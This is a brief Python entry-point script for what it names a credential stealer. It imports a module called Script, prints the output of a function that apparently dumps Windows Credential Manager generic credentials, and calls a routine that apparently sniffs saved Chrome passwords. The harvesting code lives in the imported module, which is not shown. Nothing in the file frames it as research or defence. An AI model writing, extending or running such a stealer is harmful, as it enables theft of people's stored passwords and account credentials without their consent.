import Script



if __name__ == '__main__':

    credstealer = Script.credentials()
    print(credstealer.dump_credsman_generic())

    test = Script.ChromePassword()

    test.ChromeSniff()
